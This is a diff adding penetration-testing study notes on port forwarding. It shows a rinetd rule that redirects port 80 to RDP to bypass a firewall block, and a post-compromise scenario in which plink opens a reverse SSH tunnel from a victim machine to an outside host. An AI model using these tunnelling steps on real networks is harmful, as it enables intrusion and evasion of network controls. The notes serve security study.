@@ -73,3 +73,43 @@ bob
 
 password: bob
 
+**Port Forwarding**
+
+rinetd.conf
+
+scenario1:
+
+Internal PC \(Engree port 80 and 443\)
+
+if it want to connect to remote desktop\(67.23.72.109\) it can't as RDP port is blocked.
+
+* If we have a linux machine\(208.88.127.99\) with public IP address we need to use utility rinetd.conf
+* Accept traffic of TCP port 80 and redirect to 3389
+
+```
+Bindaddress    Bindport    ConnectAddress    Connectport
+208.88.127.99    80        67.23.72.109        3389
+
+/etc/init.d/rinetd start
+```
+
+Encrypted tunnel within the ssh tunnel:
+
+SSH Local Port forwarding \(-l\):
+
+localport --&gt; remoteport \(Over ssh tunnel\)
+
+Scenario2:
+
+Initiated Client Attack \(on org\) and got shell of a internal machine \(Non routable\) -- &gt; uploaded a SSH windows client \(plink\) on vi 
+
+on victim machine we have RDP enabled \(\)
+
+Now tunnel the local rdp traffic to the remote port using plink
+
+```
+plink -l root -pw ubersecretpassword 208.88.127.99 -R 3390:127.0.0.1:3389
+```
+
+
+
